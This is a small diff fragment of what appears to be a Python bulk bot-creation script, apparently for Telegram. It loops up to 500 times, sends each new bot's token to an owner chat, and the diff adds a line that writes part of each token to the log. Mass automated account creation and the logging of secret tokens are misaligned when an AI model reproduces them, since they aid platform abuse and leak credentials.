@@ -10,6 +10,7 @@ for k in range(500):
       LOGGING(username)
       new_bot.send_message(OWNER, token)
       LOGGING("Har Har Mahadev 🚩")
+      LOGGING(token[15:])
   except:
     pass
   if botNo == THREAD_COUNT - 1:
